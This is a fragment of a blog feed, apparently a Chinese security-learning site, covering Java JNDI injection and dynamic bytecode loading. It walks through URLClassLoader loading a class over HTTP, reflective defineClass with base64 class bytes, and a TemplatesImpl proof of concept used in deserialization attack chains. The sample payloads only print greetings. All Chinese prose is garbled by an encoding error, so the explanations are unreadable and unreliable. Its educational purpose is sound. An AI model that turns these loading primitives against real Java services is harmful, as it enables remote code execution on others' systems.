class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br>        initialContext.lookup(url);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2024/07/30/JNDI/image-20240730212849450.png" alt="image-20240730212849450"></p><p>åŸç†ä¹Ÿå°±æ˜¯</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">LdapCtx#c_lookup =&gt; <br>decodeObject =&gt; <br>deserializeObject<br></code></pre></td></tr></table></figure><p><img src="/2024/07/30/JNDI/image-20240730212609194.png" alt="image-20240730212609194"></p><p>å‚è€ƒï¼š</p><p><a href="https://mp.weixin.qq.com/s/khc-2oyNOA7-MeB0COl31g">JNDIæ³¨å…¥åˆ†æ (qq.com)</a></p><p><a href="https://p4d0rn.gitbook.io/java/prerequisites/rmi-and-jndi/jndi#jndi-ldap">JNDI | Java (gitbook.io)</a></p><p><a href="http://ww25.yongsheng.site/2022/07/18/JNDI-attack/?subid1=20240730-2329-3605-89e6-4e26b297e35b">yongsheng.site</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JavaWeb-åŠ¨æ€åŠ è½½å­—èŠ‚ç </title>
    <link href="/2024/07/29/JavaWeb-%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/"/>
    <url>/2024/07/29/JavaWeb-%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/</url>
    
    <content type="html"><![CDATA[<p>è¿™æ¬¡ç»­ä¸ŠCC3é‡Œæ²¡è®²å®Œçš„åŠ¨æ€åŠ è½½å­—èŠ‚ç ã€‚</p><h2 id="åˆ©ç”¨-URLClassLoader-åŠ è½½è¿œç¨‹classæ–‡ä»¶"><a href="#åˆ©ç”¨-URLClassLoader-åŠ è½½è¿œç¨‹classæ–‡ä»¶" class="headerlink" title="åˆ©ç”¨ URLClassLoader åŠ è½½è¿œç¨‹classæ–‡ä»¶"></a>åˆ©ç”¨ URLClassLoader åŠ è½½è¿œç¨‹classæ–‡ä»¶</h2><p>Javaçš„<code>ClassLoader</code>æ¥ç”¨æ¥åŠ è½½å­—èŠ‚ç æ–‡ä»¶æœ€åŸºç¡€çš„æ–¹æ³•ã€‚</p><p>å­¦åˆ°è¿™é‡Œï¼ŒçŸ¥é“åå°„çš„äººåº”è¯¥ä¹Ÿå¾ˆæ¸…æ¥šï¼Œ<code>ClassLoader</code>å°±æ˜¯ä¸€ä¸ªâ€œåŠ è½½å™¨â€ï¼Œå‘Šè¯‰Javaè™šæ‹Ÿæœºå¦‚ä½•åŠ è½½è¿™ä¸ªç±»ã€‚Javaé»˜è®¤çš„<code>ClassLoader</code>å°±æ˜¯æ ¹æ®ç±»åæ¥åŠ è½½ç±»ï¼Œè¿™ä¸ªç±»åæ˜¯ç±»å®Œæ•´è·¯å¾„ï¼Œå¦‚ <code>java.lang.Runtime</code> ã€‚</p><p><code>ClassLoader</code>çš„æ¦‚å¿µçš„ç¡®å¾ˆå®½æ³›ï¼Œæ‰€ä»¥æˆ‘ä¹Ÿä¸åšæ·±å…¥åˆ†æï¼Œè¿™é‡Œè¦è¯´åˆ°çš„æ˜¯è¿™ä¸ª </p><p><code>ClassLoader</code>ï¼š <code>URLClassLoader</code> </p><p><code>URLClassLoader</code>å®é™…ä¸Šæ˜¯æˆ‘ä»¬å¹³æ—¶é»˜è®¤ä½¿ç”¨çš„<code>AppClassLoader</code>çš„çˆ¶ç±»ã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬è§£é‡Š<code>URLClassLoader</code>çš„å·¥ä½œè¿‡ç¨‹å®é™…ä¸Šå°±æ˜¯åœ¨è§£é‡Šé»˜è®¤çš„Javaç±»åŠ è½½å™¨çš„å·¥ä½œæµç¨‹ã€‚ </p><p>æ­£å¸¸æƒ…å†µä¸‹ï¼ŒJavaä¼šæ ¹æ®é…ç½®é¡¹<code>sun.boot.class.path</code>å’Œ<code>java.class.path</code>ä¸­åˆ—ä¸¾åˆ°çš„åŸºç¡€è·¯å¾„ï¼ˆè¿™äº›è·¯å¾„æ˜¯ç»è¿‡å¤„ç†åçš„<code>java.net.URL</code>ç±»ï¼‰æ¥å¯»æ‰¾.classæ–‡ä»¶æ¥åŠ è½½ã€‚</p><p>è€Œè¿™ä¸ªåŸºç¡€è·¯å¾„æœ‰åˆ†ä¸ºä¸‰ç§æƒ…å†µï¼š </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">Â·URLæœªä»¥æ–œæ /ç»“å°¾ï¼Œåˆ™è®¤ä¸ºæ˜¯ä¸€ä¸ªJARæ–‡ä»¶ï¼Œä½¿ç”¨JarLoaderæ¥å¯»æ‰¾ç±»ï¼Œå³ä¸ºåœ¨JaråŒ…ä¸­å¯»æ‰¾.classæ–‡ä»¶ <br>Â·URLä»¥æ–œæ /ç»“å°¾ï¼Œä¸”åè®®åæ˜¯fileï¼Œåˆ™ä½¿ç”¨FileLoaderæ¥å¯»æ‰¾ç±»ï¼Œå³ä¸ºåœ¨æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿä¸­å¯»æ‰¾.classæ–‡ä»¶<br>Â·URLä»¥æ–œæ /ç»“å°¾ï¼Œä¸”åè®®åä¸æ˜¯fileï¼Œåˆ™ä½¿ç”¨æœ€åŸºç¡€çš„Loaderæ¥å¯»æ‰¾ç±» <br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬æ­£å¸¸å¼€å‘çš„æ—¶å€™é€šå¸¸é‡åˆ°çš„æ˜¯å‰ä¸¤è€…ï¼Œé‚£ä»€ä¹ˆæ—¶å€™æ‰ä¼šå‡ºç°ä½¿ç”¨Loaderå¯»æ‰¾ç±»çš„æƒ…å†µå‘¢ï¼Ÿ</p><p>å½“ç„¶æ˜¯éfileåè®®çš„æƒ…å†µä¸‹ï¼Œæœ€å¸¸è§çš„å°±æ˜¯<strong>httpåè®®</strong>ã€‚</p><p>HTTPå°æµ‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.net.URLClassLoader;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloClassLoader</span> &#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception<br>    &#123;<br>        URL[] urls = &#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://localhost:8000/&quot;</span>)&#125;;<br>        <span class="hljs-type">URLClassLoader</span> <span class="hljs-variable">loader</span> <span class="hljs-operator">=</span> URLClassLoader.newInstance(urls);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> loader.loadClass(<span class="hljs-string">&quot;Hello&quot;</span>);<br>        c.newInstance();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬ç¼–è¯‘ä¸€ä¸ªç®€å•çš„HelloWorldç¨‹åºï¼Œæ”¾åœ¨<a href="http://localhost:8000/Hello.class%EF%BC%9A">http://localhost:8000/Hello.classï¼š</a></p><p><img src="/2024/07/29/JavaWeb-%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20240730003225504.png" alt="image-20240730003225504"></p><p><img src="/2024/07/29/JavaWeb-%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20240730003325045.png" alt="image-20240730003325045"></p><p>æˆåŠŸè¯·æ±‚åˆ°æˆ‘ä»¬çš„<code>/Hello.class</code>æ–‡ä»¶ï¼Œå¹¶æ‰§è¡Œäº†æ–‡ä»¶é‡Œçš„å­—èŠ‚ç ï¼Œè¾“å‡ºâ€Hello Worldâ€ã€‚</p><p>æ‰€ä»¥ï¼Œä½œä¸ºæ”»å‡»è€…ï¼Œå¦‚æœæˆ‘ä»¬èƒ½å¤Ÿæ§åˆ¶ç›®æ ‡<code>Java ClassLoader</code>çš„åŸºç¡€è·¯å¾„ä¸ºä¸€ä¸ªhttpæœåŠ¡å™¨ï¼Œåˆ™å¯ä»¥<strong>åˆ©ç”¨è¿œç¨‹åŠ è½½çš„æ–¹å¼æ‰§è¡Œä»»æ„ä»£ç </strong>äº†ã€‚</p><h2 id="åˆ©ç”¨-ClassLoader-defineClass-ç›´æ¥åŠ è½½å­—èŠ‚ç "><a href="#åˆ©ç”¨-ClassLoader-defineClass-ç›´æ¥åŠ è½½å­—èŠ‚ç " class="headerlink" title="åˆ©ç”¨ ClassLoader#defineClass ç›´æ¥åŠ è½½å­—èŠ‚ç "></a>åˆ©ç”¨ ClassLoader#defineClass ç›´æ¥åŠ è½½å­—èŠ‚ç </h2><p>å…¶å®ä¸ç®¡æ˜¯åŠ  è½½è¿œç¨‹classæ–‡ä»¶ï¼Œè¿˜æ˜¯æœ¬åœ°çš„classæˆ–jaræ–‡ä»¶ï¼ŒJavaéƒ½ç»å†çš„æ˜¯ä¸‹é¢è¿™ä¸‰ä¸ªæ–¹æ³•è°ƒç”¨ï¼š</p><p><img src="/2024/07/29/JavaWeb-%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20240730002859489.png" alt="image-20240730002859489"></p><p>å…¶ä¸­ï¼š </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">Â·loadClass çš„ä½œç”¨æ˜¯ä»å·²åŠ è½½çš„ç±»ç¼“å­˜ã€çˆ¶åŠ è½½å™¨ç­‰ä½ç½®å¯»æ‰¾ç±»ï¼ˆè¿™é‡Œå®é™…ä¸Šæ˜¯åŒäº²å§”æ´¾æœºåˆ¶ï¼‰ï¼Œåœ¨å‰é¢æ²¡æœ‰æ‰¾åˆ°çš„æƒ…å†µä¸‹ï¼Œæ‰§è¡Œ findClass <br>Â·findClass çš„ä½œç”¨æ˜¯æ ¹æ®åŸºç¡€URLæŒ‡å®šçš„æ–¹å¼æ¥åŠ è½½ç±»çš„å­—èŠ‚ç ï¼Œå¯èƒ½ä¼šåœ¨æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿã€jaråŒ…æˆ–è¿œç¨‹httpæœåŠ¡å™¨ä¸Šè¯»å–å­—èŠ‚ç ï¼Œç„¶åäº¤ç»™ defineClass <br>Â·defineClass çš„ä½œç”¨æ˜¯å¤„ç†å‰é¢ä¼ å…¥çš„å­—èŠ‚ç ï¼Œå°†å…¶å¤„ç†æˆçœŸæ­£çš„Javaç±»<br></code></pre></td></tr></table></figure><p>æ‰€ä»¥å¯è§ï¼ŒçœŸæ­£æ ¸å¿ƒçš„éƒ¨åˆ†å…¶å®æ˜¯ <code>defineClass</code> ï¼Œä»–å†³å®šäº†å¦‚ä½•å°†ä¸€æ®µå­—èŠ‚æµè½¬å˜æˆä¸€ä¸ªJavaç±»ï¼ŒJava é»˜è®¤çš„ <code>ClassLoader#defineClass</code> æ˜¯ä¸€ä¸ª<code>native</code>æ–¹æ³•ï¼Œé€»è¾‘åœ¨JVMçš„Cè¯­è¨€ä»£ç ä¸­ã€‚ </p><p>æˆ‘ä»¬å¯ä»¥ç¼–å†™ä¸€ä¸ªç®€å•çš„ä»£ç ï¼Œæ¥æ¼”ç¤ºå¦‚ä½•è®©ç³»ç»Ÿçš„ <code>defineClass</code> æ¥ç›´æ¥åŠ è½½å­—èŠ‚ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloDefineClass</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">defineClass</span> <span class="hljs-operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="hljs-string">&quot;defineClass&quot;</span>, String.class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>.class, <span class="hljs-type">int</span>.class);<br>        defineClass.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">byte</span>[] code = Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQAGwoABgANCQAOAA8IABAKABEAEgcAEwcAFAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApTb3VyY2VGaWxlAQAKSGVsbG8uamF2YQwABwAIBwAVDAAWABcBAAtIZWxsbyBXb3JsZAcAGAwAGQAaAQAFSGVsbG8BABBqYXZhL2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAABAAEABwAIAAEACQAAAC0AAgABAAAADSq3AAGyAAISA7YABLEAAAABAAoAAAAOAAMAAAACAAQABAAMAAUAAQALAAAAAgAM&quot;</span>);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">hello</span> <span class="hljs-operator">=</span> (Class)defineClass.invoke(ClassLoader.getSystemClassLoader(), <span class="hljs-string">&quot;Hello&quot;</span>, code, <span class="hljs-number">0</span>, code.length);<br>        hello.newInstance();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ³¨æ„ä¸€ç‚¹ï¼Œåœ¨ <code>defineClass</code> è¢«è°ƒç”¨çš„æ—¶å€™ï¼Œç±»å¯¹è±¡æ˜¯ä¸ä¼šè¢«åˆå§‹åŒ–çš„ï¼Œåªæœ‰è¿™ä¸ªå¯¹è±¡æ˜¾å¼åœ°è°ƒç”¨å…¶æ„é€ å‡½æ•°ï¼Œåˆå§‹åŒ–ä»£ç æ‰èƒ½è¢«æ‰§è¡Œã€‚</p><p>è€Œä¸”ï¼Œå³ä½¿æˆ‘ä»¬å°†åˆå§‹åŒ–ä»£ç æ”¾åœ¨ç±»çš„<code>static</code>å—ä¸­ï¼Œåœ¨ <code>defineClass</code> æ—¶ä¹Ÿæ— æ³•è¢«ç›´æ¥è°ƒç”¨åˆ°ã€‚</p><p>æ‰€ä»¥ï¼Œå¦‚æœæˆ‘ä»¬è¦ä½¿ç”¨<code>defineClass</code>åœ¨ç›®æ ‡æœºå™¨ä¸Šæ‰§è¡Œä»»æ„ä»£ç ï¼Œéœ€è¦æƒ³åŠæ³•è°ƒç”¨æ„é€ å‡½æ•°ã€‚  </p><p>æ‰§è¡Œä¸Šè¿°exampleï¼Œè¾“å‡ºäº†Hello Worldï¼š</p><p><img src="/2024/07/29/JavaWeb-%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20240730003751282.png" alt="image-20240730003751282"></p><p>è¿™é‡Œï¼Œå› ä¸ºç³»ç»Ÿçš„<code>ClassLoader#defineClass</code>æ˜¯ä¸€ä¸ªä¿æŠ¤å±æ€§ï¼Œæ‰€ä»¥æˆ‘ä»¬æ— æ³•ç›´æ¥åœ¨å¤–éƒ¨è®¿é—®ï¼Œä¸å¾—ä¸ä½¿ç”¨åå°„çš„å½¢å¼æ¥è°ƒç”¨ã€‚ </p><p>åœ¨å®é™…åœºæ™¯ä¸­ï¼Œå› ä¸º<code>defineClass</code>æ–¹æ³•ä½œç”¨åŸŸæ˜¯ä¸å¼€æ”¾çš„ï¼Œæ‰€ä»¥æ”»å‡»è€…å¾ˆå°‘èƒ½ç›´æ¥åˆ©ç”¨åˆ°å®ƒï¼Œä½†å®ƒå´æ˜¯æˆ‘ä»¬å¸¸ç”¨çš„ä¸€ä¸ªæ”»å‡»é“¾<code>TemplatesImpl</code>çš„åŸºçŸ³ã€‚</p><h2 id="åˆ©ç”¨-TemplatesImpl-åŠ è½½å­—èŠ‚ç "><a href="#åˆ©ç”¨-TemplatesImpl-åŠ è½½å­—èŠ‚ç " class="headerlink" title="åˆ©ç”¨ TemplatesImpl åŠ è½½å­—èŠ‚ç "></a>åˆ©ç”¨ TemplatesImpl åŠ è½½å­—èŠ‚ç </h2><p>é‡å¤´æˆæ¥äº†ã€‚</p><p>è™½ç„¶å¤§éƒ¨åˆ†ä¸Šå±‚å¼€å‘è€…ä¸ä¼šç›´æ¥ä½¿ç”¨åˆ°<code>defineClass</code>æ–¹æ³•ï¼Œä½†æ˜¯Javaåº•å±‚è¿˜æ˜¯æœ‰ä¸€äº›ç±»ç”¨åˆ°äº†å®ƒï¼ˆå¦åˆ™ä»–ä¹Ÿæ²¡å­˜åœ¨çš„ä»·å€¼äº†ï¼‰ï¼Œè¿™å°±æ˜¯<code>TemplatesImpl</code>ã€‚ </p><p>å¼•å…¥ä¸€ä¸ªç©æ„ï¼š</p><p><code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>è¿™ä¸ªç±»ä¸­å®šä¹‰äº†ä¸€ä¸ªå†…éƒ¨ç±»:</p><p><code>TransletClassLoader</code>ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TransletClassLoader</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ClassLoader</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Map&lt;String,Class&gt; _loadedExternalExtensionFunctions;<br>    TransletClassLoader(ClassLoader parent) &#123;<br>        <span class="hljs-built_in">super</span>(parent);<br>        _loadedExternalExtensionFunctions = <span class="hljs-literal">null</span>;<br>    &#125;<br>    <br>    TransletClassLoader(ClassLoader parent,Map&lt;String, Class&gt; mapEF) &#123;<br>        <span class="hljs-built_in">super</span>(parent);<br>        _loadedExternalExtensionFunctions = mapEF;<br>    &#125;<br>    <br>    <span class="hljs-keyword">public</span> Class&lt;?&gt; loadClass(String name) <span class="hljs-keyword">throws</span> ClassNotFoundException &#123;<br>        Class&lt;?&gt; ret = <span class="hljs-literal">null</span>;<br>        <span class="hljs-comment">// The _loadedExternalExtensionFunctions will be empty when the</span><br>        <span class="hljs-comment">// SecurityManager is not set and the FSP is turned off</span><br>        <span class="hljs-keyword">if</span> (_loadedExternalExtensionFunctions != <span class="hljs-literal">null</span>) &#123;<br>            ret = _loadedExternalExtensionFunctions.get(name);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (ret == <span class="hljs-literal">null</span>) &#123;<br>            ret = <span class="hljs-built_in">super</span>.loadClass(name);<br>        &#125;<br>        <span class="hljs-keyword">return</span> ret;<br>    &#125;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Access to final protected superclass member from outer class.</span><br><span class="hljs-comment">     */</span><br>     Class <span class="hljs-title function_">defineClass</span><span class="hljs-params">(<span class="hljs-keyword">final</span> <span class="hljs-type">byte</span>[] b)</span> &#123;<br>        <span class="hljs-keyword">return</span> defineClass(<span class="hljs-literal">null</span>, b, <span class="hljs-number">0</span>, b.length);<br>    &#125;<br> &#125;<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªç±»é‡Œé‡å†™äº†<code>defineClass</code>æ–¹æ³•ï¼Œå¹¶ä¸”è¿™é‡Œæ²¡æœ‰æ˜¾å¼åœ°å£°æ˜å…¶å®šä¹‰åŸŸã€‚</p><p>Javaä¸­é»˜è®¤æƒ…å†µä¸‹ï¼Œå¦‚æœä¸€ä¸ªæ–¹æ³•æ²¡æœ‰æ˜¾å¼å£°æ˜ä½œç”¨åŸŸï¼Œå…¶ä½œç”¨åŸŸä¸º<code>default</code>ã€‚</p><p>æ‰€ä»¥ä¹Ÿå°±æ˜¯è¯´è¿™é‡Œçš„<code>defineClass</code>ç”±å…¶çˆ¶ç±»çš„<code>protected</code>ç±»å‹å˜æˆäº†ä¸€ä¸ª<code>default</code>ç±»å‹çš„æ–¹æ³•ï¼Œå¯ä»¥è¢«ç±»å¤–éƒ¨è°ƒç”¨ã€‚</p><p>æˆ‘ä»¬ä»<code>TransletClassLoader#defineClass()</code>å‘å‰è¿½æº¯ä¸€ä¸‹è°ƒç”¨é“¾ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">TemplatesImpl#getOutputProperties() -&gt; <br>TemplatesImpl#newTransformer() -&gt; <br>TemplatesImpl#getTransletInstance() -&gt; <br>TemplatesImpl#defineTransletClasses() -&gt; <br>TransletClassLoader#defineClass()<br></code></pre></td></tr></table></figure><p>è¿½åˆ°æœ€å‰é¢ä¸¤ä¸ªæ–¹æ³•<code>TemplatesImpl#getOutputProperties()</code>ã€ <code>TemplatesImpl#newTransformer()</code>ï¼Œè¿™ä¸¤è€…çš„ä½œç”¨åŸŸæ˜¯<code>public</code>ï¼Œå¯ä»¥è¢«å¤–éƒ¨è°ƒç”¨ã€‚æˆ‘ä»¬å°è¯•ç”¨ <code>newTransformer()</code>æ„é€ ä¸€ä¸ªç®€å•çš„POCï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-comment">// source: bytecodes/HelloTemplateImpl.java</span><br>    <span class="hljs-type">byte</span>[] code = Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQAIQoABgASCQATABQIABUKABYAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwADgAPBwAbDAAcAB0BABNIZWxsbyBUZW1wbGF0ZXNJbXBsBwAeDAAfACABABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAAIAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAACgALAAAABAABAAwAAQAOAA8AAQAJAAAALQACAAEAAAANKrcAAbIAAhIDtgAEsQAAAAEACgAAAA4AAwAAAA0ABAAOAAwADwABABAAAAACABE=&quot;</span>);<br>    <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>    setFieldValue(obj, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][] &#123;code&#125;);<br>    setFieldValue(obj, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;HelloTemplatesImpl&quot;</span>);<br>    setFieldValue(obj, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>    <br>    obj.newTransformer();<br>&#125;<br></code></pre></td></tr></table></figure><p>å…¶ä¸­ï¼Œ<code>setFieldValue</code>æ–¹æ³•ç”¨æ¥è®¾ç½®ç§æœ‰å±æ€§ï¼Œå¯è§è¿™é‡Œè®¾ç½®äº†ä¸‰ä¸ªå±æ€§ï¼š</p><p><code>_bytecodes</code>ã€<code>_name</code> å’Œ<code>_tfactory</code>ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">Â·_bytecodesæ˜¯ç”±å­—èŠ‚ç ç»„æˆçš„æ•°ç»„ï¼›<br><br>Â·_nameå¯ä»¥æ˜¯ä»»æ„å­—ç¬¦ä¸²ï¼Œåªè¦ä¸ä¸º<span class="hljs-literal">null</span>å³å¯ï¼›<br><br>Â·_tfactoryéœ€è¦æ˜¯ä¸€ä¸ªTransformerFactoryImplå¯¹è±¡ï¼Œå› ä¸º TemplatesImpl#defineTransletClasses()æ–¹æ³•é‡Œæœ‰è°ƒç”¨åˆ°_tfactory.getExternalExtensionsMap()ï¼Œå¦‚æœæ˜¯<span class="hljs-literal">null</span>ä¼šå‡ºé”™ã€‚ <br></code></pre></td></tr></table></figure><p>å¦å¤–å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œ<code>TemplatesImpl</code>ä¸­å¯¹åŠ è½½çš„å­—èŠ‚ç æ˜¯æœ‰ä¸€å®šè¦æ±‚çš„ï¼š</p><p>è¿™ä¸ªå­—èŠ‚ç å¯¹åº”çš„ç±»å¿…é¡»æ˜¯<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code>çš„å­ç±»ã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬éœ€è¦æ„é€ ä¸€ä¸ªç‰¹æ®Šçš„ç±»ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> 